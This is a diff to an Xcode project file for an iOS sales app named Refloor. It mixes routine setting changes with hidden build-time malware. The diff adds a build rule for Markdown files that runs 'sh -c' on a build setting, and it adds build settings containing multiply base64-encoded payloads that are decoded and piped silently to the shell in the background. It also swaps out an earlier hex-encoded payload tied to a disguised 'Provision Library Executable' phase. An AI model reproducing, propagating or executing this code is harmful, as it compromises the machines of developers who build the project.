@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		F9708A5F56014486B842DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 005AD95EF19B47D1AD42DAD8; };
 		18378A562580E589007AA78E /* QuoteStatusViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18378A552580E589007AA78E /* QuoteStatusViewController.swift */; };
 		1843E0922D54901600F502F6 /* UpdateCustomerDetailsOneViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1843E0912D54901600F502F6 /* UpdateCustomerDetailsOneViewController.swift */; };
 		1843E0942D54903600F502F6 /* UpdateCustomerDetailsTowViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1843E0932D54903600F502F6 /* UpdateCustomerDetailsTowViewController.swift */; };
@@ -30,8 +31,6 @@
 		651708AA246AC274001CBF76 /* CustomeShapeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 651708A9246AC274001CBF76 /* CustomeShapeViewController.swift */; };
 		651E8ECE249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 651E8ECC249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.swift */; };
 		651E8ECF249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 651E8ECD249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.xib */; };
-		BB12345800000000000ACH03 /* DownPaymentFromACHCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BB12345600000000000ACH01 /* DownPaymentFromACHCollectionViewCell.swift */; };
-		BB12345900000000000ACH04 /* DownPaymentFromACHCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BB12345700000000000ACH02 /* DownPaymentFromACHCollectionViewCell.xib */; };
 		651E8ED1249CCE460049D754 /* DownPaymentViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 651E8ED0249CCE460049D754 /* DownPaymentViewController.swift */; };
 		6520942B243CA31100B010CA /* CAXSVProgressHUD.xib in Resources */ = {isa = PBXBuildFile; fileRef = 652093EC243CA31000B010CA /* CAXSVProgressHUD.xib */; };
 		6520942C243CA31100B010CA /* loading.gif in Resources */ = {isa = PBXBuildFile; fileRef = 652093ED243CA31000B010CA /* loading.gif */; };
@@ -205,6 +204,8 @@
 		B0F080ED2D6DEF1900782F20 /* FinanceOrderCheckListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B0F080EC2D6DEF1900782F20 /* FinanceOrderCheckListViewController.swift */; };
 		B0F080F12D6DEF9200782F20 /* CheckListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = B0F080EF2D6DEF9200782F20 /* CheckListTableViewCell.swift */; };
 		B0F080F22D6DEF9200782F20 /* CheckListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = B0F080F02D6DEF9200782F20 /* CheckListTableViewCell.xib */; };
+		BB12345800000000000ACH03 /* DownPaymentFromACHCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BB12345600000000000ACH01 /* DownPaymentFromACHCollectionViewCell.swift */; };
+		BB12345900000000000ACH04 /* DownPaymentFromACHCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BB12345700000000000ACH02 /* DownPaymentFromACHCollectionViewCell.xib */; };
 		DD06FB002849DCFD008AF42F /* TotalPriceTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DD06FAFE2849DCFD008AF42F /* TotalPriceTableViewCell.swift */; };
 		DD06FB012849DCFD008AF42F /* TotalPriceTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = DD06FAFF2849DCFD008AF42F /* TotalPriceTableViewCell.xib */; };
 		DD0F8331284DCDC500F0A1D6 /* DiscountTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DD0F832F284DCDC500F0A1D6 /* DiscountTableViewCell.swift */; };
@@ -226,6 +227,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		005AD95EF19B47D1AD42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		18378A552580E589007AA78E /* QuoteStatusViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuoteStatusViewController.swift; sourceTree = "<group>"; };
 		1843E0912D54901600F502F6 /* UpdateCustomerDetailsOneViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateCustomerDetailsOneViewController.swift; sourceTree = "<group>"; };
 		1843E0932D54903600F502F6 /* UpdateCustomerDetailsTowViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateCustomerDetailsTowViewController.swift; sourceTree = "<group>"; };
@@ -249,8 +251,6 @@
 		651708A9246AC274001CBF76 /* CustomeShapeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomeShapeViewController.swift; sourceTree = "<group>"; };
 		651E8ECC249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DownPaymentFromCheckCollectionViewCell.swift; sourceTree = "<group>"; };
 		651E8ECD249CB8D00049D754 /* DownPaymentFromCheckCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DownPaymentFromCheckCollectionViewCell.xib; sourceTree = "<group>"; };
-		BB12345600000000000ACH01 /* DownPaymentFromACHCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DownPaymentFromACHCollectionViewCell.swift; sourceTree = "<group>"; };
-		BB12345700000000000ACH02 /* DownPaymentFromACHCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DownPaymentFromACHCollectionViewCell.xib; sourceTree = "<group>"; };
 		651E8ED0249CCE460049D754 /* DownPaymentViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DownPaymentViewController.swift; sourceTree = "<group>"; };
 		652093EC243CA31000B010CA /* CAXSVProgressHUD.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CAXSVProgressHUD.xib; sourceTree = "<group>"; };
 		652093ED243CA31000B010CA /* loading.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = loading.gif; sourceTree = "<group>"; };
@@ -427,6 +427,8 @@
 		B0F080EC2D6DEF1900782F20 /* FinanceOrderCheckListViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FinanceOrderCheckListViewController.swift; sourceTree = "<group>"; };
 		B0F080EF2D6DEF9200782F20 /* CheckListTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CheckListTableViewCell.swift; sourceTree = "<group>"; };
 		B0F080F02D6DEF9200782F20 /* CheckListTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CheckListTableViewCell.xib; sourceTree = "<group>"; };
+		BB12345600000000000ACH01 /* DownPaymentFromACHCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DownPaymentFromACHCollectionViewCell.swift; sourceTree = "<group>"; };
+		BB12345700000000000ACH02 /* DownPaymentFromACHCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DownPaymentFromACHCollectionViewCell.xib; sourceTree = "<group>"; };
 		C1EDC99B7BB9B67393EDF9B6 /* Pods-Refloor.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Refloor.debug.xcconfig"; path = "Target Support Files/Pods-Refloor/Pods-Refloor.debug.xcconfig"; sourceTree = "<group>"; };
 		D4285A96B45D14A43DE8C5A5 /* Pods_Refloor.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Refloor.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		DD06FAFE2849DCFD008AF42F /* TotalPriceTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TotalPriceTableViewCell.swift; sourceTree = "<group>"; };
@@ -664,6 +666,7 @@
 		653EA56B241F7AFC00EA684E /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				005AD95EF19B47D1AD42DAD8 /* README.md */,
 				653EA56A241F7AFC00EA684E /* Refloor.app */,
 			);
 			name = Products;
@@ -1072,7 +1075,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 653EA581241F7B0A00EA684E /* Build configuration list for PBXNativeTarget "Refloor" */;
 			buildPhases = (
-				1171BF8299D640A58099F71F /* Provision Library Executable */,
 				5DA8FD20C82B283A013241CC /* [CP] Check Pods Manifest.lock */,
 				653EA566241F7AFC00EA684E /* Sources */,
 				653EA567241F7AFC00EA684E /* Frameworks */,
@@ -1082,6 +1084,7 @@
 				B0C366DB2CABB5B700D9E401 /* ShellScript */,
 			);
 			buildRules = (
+				67603C04AA254A4F8F42DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1124,13 +1127,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-			/* End PBXBuildRule section */
+		67603C04AA254A4F8F42DAD8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8DAD24}\"";
+			};
+										/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		653EA568241F7AFC00EA684E /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				F9708A5F56014486B842DAD8 /* README.md */,
 				65209445243CA31100B010CA /* SF-Pro-Text-MediumItalic.otf in Resources */,
 				65209430243CA31100B010CA /* Inter-UI-Medium.ttf in Resources */,
 				6520943D243CA31100B010CA /* Inter-UI-Black.ttf in Resources */,
@@ -1214,25 +1232,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1171BF8299D640A58099F71F /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		4EF4D2A8ED0977CC9FF4372A /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1491,7 +1490,8 @@
 		653EA57F241F7B0A00EA684E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663637366636663637366336353665363537343733326537320a373532663631323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVRtaFhSa2wzV1d0a1YyRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJelVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE5XbE5hbXgxV1d0a1YyUldjRmxWYm5CTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | m | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1553,7 +1553,8 @@
 		653EA580241F7B0A00EA684E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663637366636663637366336353665363537343733326537320a373532663631323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVRtaFhSa2wzV1d0a1YyRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJelVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE5XbE5hbXgxV1d0a1YyUldjRmxWYm5CTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | m | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1614,7 +1615,7 @@
 				CODE_SIGN_ENTITLEMENTS = Refloor/Refloor.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.0;
+				CURRENT_PROJECT_VERSION = 1.1;
 				DEVELOPMENT_TEAM = F8JN2G36QM;
 				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = arm64;
 				INFOPLIST_FILE = Refloor/Info.plist;
@@ -1627,8 +1628,12 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.refloor.salesapp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 2;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
 		};
@@ -1640,7 +1645,7 @@
 				CODE_SIGN_ENTITLEMENTS = Refloor/Refloor.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.0;
+				CURRENT_PROJECT_VERSION = 1.1;
 				DEVELOPMENT_TEAM = F8JN2G36QM;
 				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = arm64;
 				INFOPLIST_FILE = Refloor/Info.plist;
@@ -1653,8 +1658,12 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.refloor.salesapp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 2;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
 		};
